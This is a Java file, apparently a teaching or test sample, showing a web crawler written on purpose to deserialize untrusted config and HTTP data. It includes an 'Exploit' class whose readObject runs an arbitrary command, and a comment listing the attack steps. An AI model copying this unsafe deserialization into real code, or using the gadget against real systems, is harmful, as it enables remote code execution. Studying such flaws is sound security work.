import java.io.*;
import java.net.*;
import java.util.*;

// 模拟爬虫任务配置类
record CrawlerTask(String url, boolean deserializeResponse) implements Serializable {}

// 恶意反序列化载体
class Exploit implements Serializable {
    private String command;
    
    public Exploit(String cmd) {
        this.command = cmd;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec(command);
    }
}

// 网络爬虫核心类
public class WebCrawler {
    // 模拟声明式配置加载
    private static CrawlerTask loadConfig() {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("config.ser"))) {
            return (CrawlerTask) ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
            return new CrawlerTask("https://example.com", false);
        }
    }

    // 模拟网络请求处理
    private static void processResponse(InputStream is, boolean deserialize) {
        try {
            if (deserialize) {
                // 危险的反序列化操作
                ObjectInputStream ois = new ObjectInputStream(is);
                Object obj = ois.readObject();
                System.out.println("反序列化对象类型: " + obj.getClass());
            } else {
                // 正常处理HTML响应
                Scanner scanner = new Scanner(is);
                while (scanner.hasNextLine()) {
                    System.out.println("HTML内容: " + scanner.nextLine());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 模拟爬虫执行
    public static void main(String[] args) {
        CrawlerTask config = loadConfig();
        
        try {
            URL url = new URL(config.url());
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            System.out.println("开始爬取: " + config.url());
            processResponse(conn.getInputStream(), config.deserializeResponse());
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

/*
攻击者攻击步骤：
1. 诱导爬虫访问恶意服务器
2. 服务器返回序列化后的Exploit对象
3. 爬虫配置被篡改为deserializeResponse=true
4. 触发反序列化时执行任意命令
*/